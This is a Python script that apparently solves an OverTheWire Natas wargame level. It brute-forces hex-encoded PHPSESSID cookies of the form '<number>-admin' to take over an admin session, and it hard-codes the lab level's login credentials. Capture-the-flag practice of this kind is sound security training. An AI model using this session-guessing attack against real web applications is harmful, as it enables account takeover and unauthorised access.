import requests
import binascii

auth = ("natas20", "p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw")
url = "http://natas20.natas.labs.overthewire.org"

# Session IDs are likely hex representations of something like user-id
# Let's try from 1 to 640, encode as hex
for i in range(1, 640):
    sid = binascii.hexlify(f"{i}-admin".encode()).decode()
    cookies = {"PHPSESSID": sid}
    
    r = requests.get(url, auth=auth, cookies=cookies)

    if "You are an admin. The credentials for the next level are:" in r.text:
        print(f"[+] Found admin session: {sid}")
        print(r.text)
        break
    else:
        print(f"[-] Tried {sid}")


